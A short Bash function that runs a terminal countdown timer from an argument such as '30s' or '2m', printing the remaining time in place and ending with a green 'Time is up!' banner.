cd_timer() {
  # countdown_timer 
  # Grab whatever the user typed, e.g. "30s" or "2m"
  local time_input="$1"

  if [ -z "$time_input" ]; then
    # If no input, default to 1 minute
    hour=0
    min=1
    sec=0
  else
    # Let's see whether the user wants seconds or minutes
    local unit="${time_input: -1}"   # last character (s or m)
    local value="${time_input%?}"    # everything except that last character

    if [[ "$unit" == "m" ]]; then
      hour=0
      min="$value"
      sec=0
    elif [[ "$unit" == "s" ]]; then
      # Convert total seconds into minutes and seconds
      hour=0
      min=$((value / 60))
      sec=$((value % 60))
    else
      # If it’s something else, let’s default to 1 minute
      hour=0
      min=1
      sec=0
    fi
  fi

  # The good ol’ triple loop countdown
  while [ $hour -ge 0 ]; do
    while [ $min -ge 0 ]; do
      while [ $sec -ge 0 ]; do
        echo -ne "$hour:$min:$sec\033[0K\r"
        ((sec--))
        sleep 1
      done
      sec=59
      ((min--))
    done
    min=59
    ((hour--))
  done

  # When the timer hits zero, print the cute green banner
  echo -e "\n\e[32m=============================="
  echo -e "         Time is up!"
  echo -e "==============================\e[0m"
}


